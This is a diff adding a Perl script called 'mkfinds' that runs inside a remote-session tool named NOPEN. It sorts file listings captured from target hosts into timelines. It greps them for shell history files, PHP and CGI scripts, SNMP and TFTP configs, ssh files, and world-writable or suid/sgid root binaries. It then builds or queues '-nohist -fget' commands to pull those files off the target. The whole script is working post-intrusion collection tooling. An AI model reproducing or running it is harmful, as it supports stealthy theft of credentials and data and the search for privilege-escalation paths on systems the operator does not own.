@@ -1,0 +1,491 @@
+#!/usr/bin/env perl
+$| = 1 ;
+$VER = "1.9.2.1" ;
+myinit() ;
+my $lsh="-lsh" if $fromnopen;
+my $lshless = "$lsh xterm -title neatfiles.perms.$targethost -geometry 160x56-0+0 -e less $opdown/neatfiles.perms.$targethost > /dev/null 2>&1 &";
+if ($justdoit) {
+  open(NOPENOUT,"> $opetc/nopen_auto.$nopen_mypid.mkfindstmp") ||
+    die "Cannot open > $opetc/nopen_auto.$nopen_mypid.mkfindstmp" ;
+#; rm -f $opetc/nopen_auto.$nopen_mypid
+  print NOPENOUT "#NOGS\n-lsh sleep 1    ; while [ 1 ] ; do sleep 2 ; [ -e $opetc/nopen_auto.$nopen_mypid ] && break 2>/dev/null ; done\n" ;
+  close(NOPENOUT);
+  rename ("$opetc/nopen_auto.$nopen_mypid.mkfindstmp","$opetc/nopen_auto.$nopen_mypid") ;
+}
+
+@finds = (split (/\n/, `ls -1 $dir/${targethost}-find 2>/dev/null`) );
+my $howmany = "this" ;
+my $howmany1 = "is" ;
+my $plural = "" ;
+if (@finds) {
+  if (@finds > 1) {
+    $howmany = "these";
+    $howmany1 = "are";
+    $plural = "s" ;
+  }
+  print "
+Making sorted finds. Found $howmany source file$plural:\n";
+  foreach (@finds) {
+    print "\t$_\n" ;
+  }
+ } else {
+   die "nothing to do in $dir";
+}
+($allpids,$greppids) = () ;
+print "\n";
+foreach $find (@finds) {
+  ($host) = $find =~ /([^\/]*)-find/ ;
+  unless ($skipssh) {
+    unlink("$destdir/$host.find.SSH") if $wipefirst;
+    if (! -e "$destdir/$host.find.SSH") {
+      $pid = fork;
+      if ($pid) {
+	$allpids .= "|$pid" ;
+	print "Building new $destdir/$host.find.SSH (pid=$pid)\n" ;
+      } else {
+	my $c = $column{$ext};
+	myexec("grep ssh $find > $destdir/$host.find.SSH");
+      }
+    } else {
+      print "$destdir/$host.find.SSH exists, skipping\n";
+    }
+  }#ssh grep
+  foreach $ext (@timetypes) {
+    unlink("$destdir/$host.find.sorted.time$ext") if $wipefirst;
+    if (! -e "$destdir/$host.find.sorted.time$ext") {
+      $pid = fork;
+      if ($pid) {
+	$allpids .= "|$pid" ;
+	print "Building new $destdir/$host.find.sorted.time$ext (pid=$pid)\n" ;
+      } else {
+	my $c = $column{$ext};
+	myexec("lsstamp -s -c$c $find > $destdir/$host.find.sorted.time$ext");
+      }
+    } else {
+      print "$destdir/$host.find.sorted.time$ext exists, skipping\n";
+    }
+  }#foreach $ext
+  if ($grepping) {
+    $pid = fork;
+    if ($pid) {
+      $greppids .= "|$pid" ;
+      sleep 3 ;
+    } else { # this is child
+#      close(STDOUT) ;
+#      close(STDERR) ;
+      open(FINDIN,"< $find") || die "cannot open < $find" ;
+      open(FINDOUT,"> $opdown/neatfiles.$host") || die "cannot open > $opdown/neatfiles.$host" ;
+      open(FINDFILEONLY,"> $opdir/fgetgiant.neatfiles.$host") || die "cannot open > $opdir/fgetgiant.neatfiles.$host" ;
+#      open(FINDDBG,"> /tmp/neatfiles.$host") || die "cannot open > /tmp/neatfiles.$host" ;
+      open(PERMSOUT,"> $opdown/neatfiles.perms.$host") || die "cannot open > $opdown/neatfiles.perms.$host" ;
+#      warn("DBG: Looking for $filesgrep");
+      my ($sgidperms,$suidperms,$wwperms) = ();
+      my $uidpermlines=0;
+      my $suidpermlines=0;
+      my $guidpermlines=0;
+      my $wwpermlines=0;
+      while (<FINDIN>) {
+#	($inode,$mode,$link,$owner,$group,$size,$junk,$mtime,$junk,$atime,$junk,$ctime,$junk,$filenamefull) = split (/\s+
+	($type,$rest,$path,$filename) = 
+	  /\s*\d+\s+(\S)([^\/]*)(\/.*)\/([^\/]*)/ ;
+	($size) = $rest =~ /\S+\s+\S+\s+\S+\s+\S+\s+(\d+)/ ;
+	next if ( "dbcsl" =~ /$type/) ; # skip special crap and directories
+#  $filesgrep = "php$fuzzy|cgi$fuzzy|.*history$fuzzy|^ |\\\.\\\.\\\.|snmp.conf$fuzzy" ;
+	
+	if ($filename =~ 
+#  $filesgrep = "php$fuzzy|cgi$fuzzy|.*history$fuzzy|^ |\\\.\\\.\\\.|snmp.conf$fuzzy" ;
+	    /(\.php$fuzzy|\.cgi$fuzzy|^\..*history$fuzzy|^ |\.\.\.|snmp.conf$fuzzy|tftp.*conf$fuzzy)/) {
+	  print FINDOUT ;
+	  if ($size < 1000000 and ! ($type eq "d")) {
+	    print FINDFILEONLY ; # $filename has its own \n
+	  }
+	}
+	my $mtimeonly = $_;
+        $mtimeonly =~ s/ \|( [^\|]+ )\| [^\|]+\| [^\|]+\| /$1/;
+	if (/^\s*\d+\s+........w.\s/) {                     # world writable
+	  $wwperms .= $mtimeonly;
+	  $wwpermlines++;
+	}
+	my $justshown=0;
+	if (/^\s*\d+\s+...[sS]......\s+\d+\s+root/) {       # suid root
+	  $uidpermlines++;
+	  $suidpermlines++;
+	  $suidperms .= $mtimeonly;
+	  $justshown++;
+	}
+	if (/^\s*\d+\s+......[sS]...\s+\d+\s+\S+\s+root/) { # sgid root
+	  unless ($justshown) {
+	    $sgidperms .= $mtimeonly;
+	    $uidpermlines++;
+	    $guidpermlines++;
+	  }
+	}
+      }#while (<FINDIN>)
+      if ($wwperms) {
+	print PERMSOUT "World writable files:$more\n".
+                       "---------------------\n". $wwperms."\n\n";
+      }
+      if ($suidperms) {
+	print PERMSOUT "suid root files:$more\n".
+                       "----------------\n". $suidperms."\n\n";
+	$uidpermlines+=4;
+      }
+      if ($sgidperms) {
+	print PERMSOUT "sgid root files:$more\n".
+                       "----------------\n". $suidperms."\n\n";
+	$uidpermlines+=4;
+      }
+      close(PERMSOUT) ;
+      close(FINDIN) ;
+      close(FINDOUT) ;
+      close(FINDFILEONLY) ;
+      open(FINDIN,"/bin/sort +5n $opdir/fgetgiant.neatfiles.$host |") || die "unable to open sort +5n command" ;
+      open(FINDSIZE,"> $opdir/neatfiles.bysize.$host") || die "unable to open > $opdir/neatfiles.bysize.$host" ;
+      my $totalsize = 0;
+      my $filestoget = 0 ;
+      while (<FINDIN>) {
+	# This input has neat files sorted by size and no files > 1000000 bytes
+#	($inode,$mode,$link,$owner,$group,$size) = split (/\s+/) ;
+	($type,$rest,$path,$filename) = 
+	  /\s*\d+\s+(\S)([^\/]*)(\/.*)\/([^\/]*)/ ;
+	($size) = $rest =~ /\S+\s+\S+\s+\S+\s+\S+\s+(\d+)/ ;
+	$totalsize += $size ;
+	last if ($totalsize > $maxsize) ;
+	$filestoget++ ;
+#	print FINDDBG "found $size $type $path\t\t$filename ::: $_" ;
+	print FINDSIZE "$path/$filename" ; # $filename has its own \n
+      }
+      my $more = "" ;
+      if ($totalsize > $maxsize) {
+	$totalsize -= $size ;
+	my $linesleft = 1 ;
+	$linesleft++ while (<FINDIN>) ;
+	my $tobe = " to be" unless $justdoit ;
+	$more = "\nMAXIMUM size hit with $linesleft files not retrieved. Files not$tobe downloaded:\n\n".
+	  "\t-lsh /bin/sort +5n $opdir/fgetgiant.neatfiles.$host | tail -$linesleft | lss -Sc1";
+      }
+      if ($justdoit) {
+	`echo -e "\n\nDownload of all files will be $totalsize bytes$more" > $opdir/neatfiles.size.$host` ;
+      } else {
+	`echo -e "\n\nDownload of all files would be $totalsize bytes$more" > $opdir/neatfiles.size.$host` ;
+      }
+      close(FINDIN) ;
+      close(FINDSIZE) ;
+      close(FINDGET) ;
+      open(NOPENOUT,"> $opetc/nopen_auto.$nopen_mypid.mkfindstmp") ||
+	die "Cannot open > $opetc/nopen_auto.$nopen_mypid.mkfindstmp" ;
+      print NOPENOUT "#NOGS\n" ;
+      if ($justdoit and $host eq $nopen_rhostname) {
+	print NOPENOUT "-nohist -fget $opdir/neatfiles.bysize.$host\n" ;
+      }
+      print NOPENOUT "-nohist -lsh echo -e \"\\\\n\\\\nPaste this to see all suid/guid/world-writable files in a popup:\\\\n\\\\n$lshless\\\\n\\\\n\"\n" ;
+      close(NOPENOUT);
+sleep 1;
+      rename("$opetc/nopen_auto.$nopen_mypid.mkfindstmp","$opetc/nopen_auto.$nopen_mypid") || warn("rename nopen_auto.$nopen_mypid.mkfindstmp failed");
+      #      `echo "#NOGS" > $opetc/nopen_auto.$nopen_mypid` unless
+      #	(-s "$opetc/nopen_auto.$nopen_mypid") ;
+      exit ; # child exits here
+    }#if parent else child
+  }#if $grepping
+}#foreach $find (@finds)
+if (! $allpids) {
+  print "Found no files to create.\n\n";
+} else {
+  $allpids =~ s/^\|// ;
+  $greppids =~ s/^\|// ;
+  print "\nNow creating sorted finds in background.\n\n
+     ps -ef$www | egrep '$allpids' | egrep -v 'perl|grep'\n";
+}
+print "     ls -al @finds $destdir/$host*find.sorted*\n
+Pastables above for your use.\n";
+
+if ($tmp = `ls -al @finds $destdir/$host*.find.sorted*`) {
+  print "\n$destdir currently has these sorted finds (may still be growing):\n\n$tmp\n";
+}
+
+if ($allpids) {
+  my $howmany = "this" ;
+  my $howmany1 = "is" ;
+  my $plural = "" ;
+  if (@finds > 1) {
+    $howmany = "these";
+    $howmany1 = "are";
+    $plural = "s" ;
+  }
+  open(PERLOUT,"> /tmp/mkfinds.wait") || die "Cannot open /tmp/mkfinds.wait" ;
+  print PERLOUT "#!/usr/bin/env perl
+\$| = 1 ;
+print \"\\aThe mkfind$plural $howmany1 building${grepping}...\";
+";
+  if ($grepping) {
+    $whattosay = "\\nFiles with neat permissions:\\n\\n$lshless\\n\\n" ;
+    if ($justdoit) {
+      $whattosay .= "Files already being downloaded from $nopen_rhostname via the following:\\n\\n\$fgets" ;
+    } else {
+      $whattosay .= "Use $howmany ON THE CORRECT HOST$plural to get interesting files up to $maxsize bytes:\\n\\n\$fgets" ;
+    }
+    print PERLOUT <<"EOF";
+while (1) {
+  last unless `ps -ef$www | egrep '$greppids' | egrep -v 'grep'` ;
+  sleep 2 ;
+}
+if (\$fgets = `ls -1  $opdir/neatfiles.bysize.$host | sed "s/^/-fget /g"`) {
+  print ("\\n\\n$whattosay\\n\\n") ;
+  print `wc -l $opdir/neatfiles.* | grep -vi total` ;
+  print `cat $opdir/neatfiles.size.$host` ;
+}
+EOF
+  }
+  print PERLOUT <<"EOF";
+while (1) {
+  last unless `ps -ef$www | egrep '$allpids' | egrep -v 'perl|grep'` ;
+  sleep 2;
+}
+EOF
+foreach $find (@finds) {
+  ($host) = $find =~ /([^\/]*)-find/ ;
+  print PERLOUT <<"EOF";
+if ($domac) {
+  print "\\nGenerating MAC times for $host\\n";
+
+  open(OFILE, "> $destdir/$host.find.macraw") or die("Cannot open > $destdir/$host.find.macraw: $!");
+  open(M, "$destdir/$host.find.sorted.timem") or die("Cannot open $destdir/$host.find.sorted.timem: $!");
+  open(A, "$destdir/$host.find.sorted.timea") or die("Cannot open $destdir/$host.find.sorted.timea: $!");
+  open(C, "$destdir/$host.find.sorted.timec") or die("Cannot open $destdir/$host.find.sorted.timec: $!");
+  print OFILE "m:".\$_ while (<M>);
+  print OFILE "a:".\$_ while (<A>);
+  print OFILE "c:".\$_ while (<C>);
+  close(M);
+  close(A);
+  close(C);
+  close(OFILE);
+  system("sleep 2 ; sync");
+  system("lsstamp -o -S $destdir/$host.find.macraw | sort > $destdir/$host.find.sorted.macrawdate");
+  unlink("$destdir/$host.find.macraw");
+
+  open(MAC, "> $destdir/$host.find.sorted.mac");
+  open(MACRAW, "$destdir/$host.find.sorted.macrawdate");
+
+  my \%lines = () ;
+  \$date = "";
+  while ( defined (\$line1 = <MACRAW>)) {
+    \$line1 =~ s/^(\\d*)://; 
+    if ((\$1 eq \$date)) {
+      \$line1 =~ s/^(.)://;
+      \$lines{\$line1} .= \$1;
+    } else {
+      \$line1 = \$1 . ":" . \$line1;
+      \$date = \$1;
+      foreach \$key (sort keys \%lines) {
+        \@toprint = split /(\\/)/, \$key;
+        \$macstring = ((\$lines{\$key} =~ m/m/)?"m":"-") .
+                     ((\$lines{\$key} =~ m/a/)?"a":"-") .
+                     ((\$lines{\$key} =~ m/c/)?"c":"-") ;
+        # picky, picky...fix spacing on inode and size for the few that are large
+        my (\$inode,\$rest1,\$group,\$size,\$rest2) =
+          \$toprint[0] =~ /^\\s*(\\d+)(\\s+\\S+\\s+\\S+\\s+\\S+\\s+)(\\S+)\\s+(\\S+)(.*)/ ;
+        \$inode = sprintf("%10d",\$inode);
+        my \$groupsize = sprintf("%-8s %11d",\$group,\$size);
+        shift(\@toprint) ;
+        \$printstring = \$inode . \$rest1 . \$groupsize . \$rest2 ."\$macstring " ;
+        \$printstring .=  \$_ foreach \@toprint ;
+        print MAC \$printstring;
+        delete(\$lines{\$key});
+      }
+      redo;
+    }
+  }
+  close(MACRAW);
+  close(MAC);
+  unlink("$destdir/$host.find.sorted.macrawdate");
+}
+EOF
+}
+print PERLOUT <<"EOF";
+print "\\a\\n
+ls -al @finds $destdir/$host*.find.sorted*\\n".
+\`ls -al @finds $destdir/$host*.find.sorted*\`.
+"\\n\\nls -al $opdown/neatfiles*$host*\\n".
+\`ls -al $opdown/neatfiles*$host*\`.
+"\\nFiles with neat permissions:\\n\\n$lshless\\n\\n";
+sleep 1 ;
+print "\\a\\n" ;
+sleep 1 ;
+print "\\a\\n" ;
+<STDIN> ;
+EOF
+  close(PERLOUT) ;
+  `chmod 777 /tmp/mkfinds.wait` ;
+  # child execs mkfinds.wait
+  $xargs = "-bg white -fg darkblue -geometry 119x45+0+0 -title mkfinds_building" ;
+  myexec("xterm $xargs -e /tmp/mkfinds.wait") unless ( $pid = fork ) ;
+  # parent exits - get prompt right back
+  if ($grepping) {
+    print "\n\ngrepping in $find (pid=$pid) for these regexps:\n  $filesgrep\n  $permsgrep\n\n";
+    my $howlong = 30 ;
+    until ($howlong <= 0 or -e "$opetc/nopen_auto.$nopen_mypid") {
+      sleep 2;
+      $howlong -= 2;
+    }
+    if ($howlong <= 0) {
+      print "\n\nGiving you your NOPEN prompt back now. The file with world writable and suid/sgid
+files in it ($opdown/neatfiles.perms.$host)
+is not yet ready. When it is, you will see it's content here after your next command/<CR>.\n\n";
+    }
+  }
+}
+
+sub myinit {
+  use File::Basename;
+  require "getopts.pl";
+  $COLOR_SUCCESS="\033[1;32m";
+  $COLOR_FAILURE="\033[1;31m";
+  $COLOR_WARNING="\033[1;33m";
+  $COLOR_NORMAL="\033[0;39m";
+  $COLOR_NOTE="\033[0;34m";
+  $prog = basename $0 ;
+  $opdir = "/current" ;
+  $opetc = "$opdir/etc" ;
+  $opbin = "$opdir/bin" ;
+  $opdown = "$opdir/down" ;
+  $nopen_mypid = $ENV{NOPEN_MYPID} ;
+  $nopen_mylog = $ENV{NOPEN_MYLOG} ;
+  $nopen_rhostname = $ENV{NOPEN_RHOSTNAME} ;
+  $fromnopen = $nopen_rhostname;
+  $| = 1;
+  usage("bad option(s)") if (! &Getopts( "hvomacgfJM:A" ) );
+  $showall = ($opt_A or !$fromnopen);
+  $targethost = $showall ? "*" : $fromnopen ;
+  $skipm = $opt_m ;
+  $skipa = $opt_a ;
+  $skipc = $opt_c ;
+  push(@timetypes,"m") unless $skipm ;
+  push(@timetypes,"a") unless $skipa ;
+  push(@timetypes,"c") unless $skipc ;
+  $domac = 1 if (!$skipm && !$skipa && !$skipc);
+  $grepping = "/grepping" unless $opt_g ;
+  $justdoit = $opt_J and $fromnopen ;
+  $fuzzy = "\$" unless $opt_f ;
+  $filesgrep = "/(\\.php$fuzzy|\\.cgi$fuzzy|^\\..*history$fuzzy|^ |\\.\\.\\.|snmp.conf$fuzzy|tftp.*conf$fuzzy)/)" ;
+  # look for world writable | suid | sgid
+  $permsgrep = "/^\\s*\\d+\\s+(".
+    "........w.\\s|".                     # world writable
+    "...[sS]......\\s+\\d+\\s+root|".       # suid root
+    "......[sS]...\\s+\\d+\\s+\\S+\\s+root". # suid root
+    ")/";
+  $coolgrep = "tftp.*conf$fuzzy|\/tftproot" ;
+  $suidgrep = "-..s.....x" ;
+  $wipefirst = $opt_o ;
+  $maxsize = int($opt_M) ;
+  $maxsize = 5000000 unless ($maxsize > 0);
+  
+  if ($opt_v) {
+    print "$prog version $VER\n";
+    exit;
+  }
+  #default values
+  while (@ARGV) {
+    $dir = shift @ARGV;
+    $destdir = $dir;
+    die "No such directory $dir" unless -d $dir ;
+    $current = 0;
+  }
+  if (!$dir) {
+    if (-d "$opdown/cmdout") {
+      $dir = "$opdown/cmdout";
+      $destdir = "$opdir";
+      $current = 1;
+    } else {
+      $dir = "./";
+      $destdir = "./";
+      $current = 0;
+    }
+  }
+  if (`uname` =~ /Linux/) {
+    $www = "www" ;
+  } else {
+    $www = "" ;
+  }
+  %column = ("m",1,
+	     "a",2,
+	     "c",3,
+	    );
+
+  $vertext = "$prog version $VER\n" ;
+  $usagetext="$COLOR_NOTE
+Usage:  $prog [options] [sourcedir]
+$COLOR_NORMAL
+OPTIONS
+
+ -A      Process all *-find files [from command line this is default,
+         from within a NOPEN session, defaults to only that target]
+ -o      Use any HOST-find files found to build fresh sorted finds in
+         $opdir even if there are some there already.
+ -[mac]  Do not bother with sorts for [mac]time (default does all).
+ -g      Skip greps on the HOST-find files found even if not yet done.
+ -f      Fuzzy--When grepping for files of interest, grep anywhere on
+         the line, not just the end (e.g., get \"php.bak\" files, too).
+ -J      Just get the files of interest automatically (could be MANY!),
+         rather than merely give a pastable to do so.
+ -M #    Max number of bytes (aggregate) to download when getting files.
+         [default is $maxsize]
+
+
+mkfinds looks first in $opdown/cmdout and then in ./ for any files
+of the form \"HOST-find\". If they exist, lsstamp is used to create up to
+three sorted find files $opdir/HOST.find.sorted.time[mac], one for
+each of mtime, atime and ctime, and also a $opdir/HOST.find.sorted.mac
+file, where the \"[m-][a-][c-]\" field just before the filename indicates
+which of those entries are that time. E.g., if a file has m- and atime
+the same, it will have \"ma-\" in this field next to that time, and
+elsewhere in the .mac file will have the ctime after \"--c\".
+
+ * If you created a new HOST2-find file from another host, just re-run
+   mkfinds and it will create new sorted files from the new file.
+
+ * All sorting is done in the background, so you immediately get a
+   prompt back, along with a pastable command or two.
+
+ * mkfinds pops up a window indicating when background sorting is done.
+
+ * mkfinds saves off a .find.SSH file with all files containing \"ssh\".
+   This is used by the NOPEN script -gs ssh.
+
+ * If not done previously for a particular HOST-find file, the find is
+   grepped for files of interest, and a $opdir/neatfiles.bysize.HOST
+   file is created that will get them from the remote system (a \"-fget\"
+   pastable is provided to do so), smallest to largest, and at most
+   $maxsize bytes (aggregate). Files of interest are those matching this
+   (perl) regexp, and are saved in $opdown/neatfiles.HOST:
+
+     $filesgrep
+
+ * Also if not done previously, the HOST-find file is grepped looking
+   for neat permissions: world writable, suid root and sgid root. Those
+   files are saved in $opdown/neatfiles.perms.HOST. This is the
+   regexp used to find these files:
+
+    $permsgrep
+
+NOTE: mkfinds is automatically run, with no arguments, every time NOPEN
+      does a -find command.
+
+";
+  usage() if $opt_h or $opt_v ;
+
+} #myinit
+sub usage() {
+  print "\nFATAL ERROR: @_\n" if ( @_ );
+  print $usagetext;
+  print $vertext if $opt_h or $opt_v ;
+  print "\nFATAL ERROR: @_\n" if ( @_ );
+  exit;
+}#usage
+sub myexec {
+  close(STDOUT) ;
+  close(STDERR) ;
+  exec("@_");
+}#myexec
+sub dbg {
+  print STDERR "@_\n";
+}#dbg
